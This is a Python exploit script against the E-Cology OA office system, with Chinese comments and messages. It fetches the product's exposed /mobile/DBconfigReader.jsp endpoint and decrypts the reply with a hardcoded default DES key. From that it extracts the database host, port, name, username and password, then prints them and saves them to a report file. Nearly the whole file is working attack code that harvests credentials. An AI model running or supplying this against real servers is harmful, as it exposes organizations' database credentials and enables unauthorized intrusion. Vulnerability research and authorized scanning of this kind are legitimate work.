#E_Colony_Database_configuration_information_leakage.py
import pyDes
import requests

import time
filename = "./reps/E_Cology_OA_数据库配置信息泄漏-"+str(time.strftime("%Y-%m-%d", time.localtime()))

payload = "/mobile/DBconfigReader.jsp"

# 解密
def desdecode(secret_key, s):
    cipherX = pyDes.des('        ')
    cipherX.setKey(secret_key)
    y = cipherX.decrypt(s)
    return y

def ecdcil(url):
    try:
        url = url + payload
        res = requests.get(url, verify=False, timeout=10)
        if res.status_code == 200 and len(res.text) !=10 and "Exception" not in res.text :
            print("\033[0;32;40m[+] {} 疑似存在E_Cology_OA_数据库配置信息泄漏漏洞！！！\033[0m".format(url))
            res = res.content
            try:
                data = desdecode('1z2x3c4v5b6n', res.strip())
                data = data.strip()
                dbType = str(data).split(';')[0].split(':')[1]
                dbUrl = str(data).split(';')[0].split(':')[2].split('//')[1]
                dbPort = str(data).split(';')[0].split(':')[3]
                dbName = str(data).split(';')[1].split(',')[0].split('=')[1]
                dbUser = str(data).split(';')[1].split(',')[1].split('=')[1]
                dbPass = str(data).split(';')[1].split(',')[2].split('=')[1]
                info = (url +
                      "\n    DBType: {0}\n    DBUrl: {1}\n    DBPort: {2}\n    DBName: {3}\n    DBUser: {4}\n    DBPass: {5}".format(
                          dbType, dbUrl, dbPort, dbName, dbUser, dbPass))
                print(url +
                      "\n    DBType: {0}\n    DBUrl: {1}\n    DBPort: {2}\n    DBName: {3}\n    DBUser: {4}\n    DBPass: {5}".format(
                          dbType, dbUrl, dbPort, dbName, dbUser, dbPass))
                f = open(filename, "a+", encoding="utf-8")
                #f.write(url)
                f.write(info)
                f.write("\n")
                f.close()
            except Exception as e:
                print("DES解密失败, 可能默认密钥错误, 手动访问进行确认: {}".format(url))
        else:
            print("\033[0;31;40m[-] url: {} E_Cology_OA_数据库配置信息泄漏漏洞 \033[0m".format(url))
    except Exception as e:
        print("url:{} 请求失败".format(url))